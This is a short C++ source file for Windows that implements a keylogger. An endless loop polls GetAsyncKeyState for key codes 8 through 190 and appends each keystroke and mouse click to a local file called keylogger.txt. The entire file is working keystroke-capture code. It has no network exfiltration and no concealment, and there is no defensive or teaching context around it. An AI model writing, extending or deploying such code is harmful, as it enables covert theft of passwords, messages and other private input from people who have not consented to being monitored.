#include <iostream>
#include <fstream>
#include <windows.h>
#include <stdio.h>
#include <string>


using namespace std;


//save data into log file 

void writeToLog(LPCSTR text){
    ofstream logfile;
    logfile.open("keylogger.txt", fstream::app);
    logfile << text;
    logfile.close();

}

bool KeyIsLIsted(int key) {
    switch(key){
        case VK_SPACE:
            cout<<" ";
            writeToLog(" ");
            break;
        case VK_RETURN:
            cout<<"\n";
            writeToLog("\n");
            break;
        case VK_SHIFT:
            cout<<" *SHIFT* ";
            writeToLog(" *SHIFT* ");
            break;
        case VK_BACK:
            cout<< "\b";
            writeToLog("\b");
            break;
        case VK_RBUTTON:
            cout<<" *RCLICK* ";
            writeToLog(" *RCLICK* ");
            break;
        case VK_LBUTTON:
            cout<<" *LCLICK* ";
            writeToLog(" *LCLICK* ");
            break;
        default: return false;
    }
    return true;
}


int main(){
    char key;
    while(true){
        //sleep(10);
        for (key = 8 ; key<=190; key++){
            if (GetAsyncKeyState(key) == - 32767){
                if (KeyIsLIsted(key) == false){
                    ofstream logfile;
                    logfile.open("keylogger.txt", fstream::app);
                    logfile << key;
                    logfile.close();
                }
            }
        }
    }


    return 0;
}
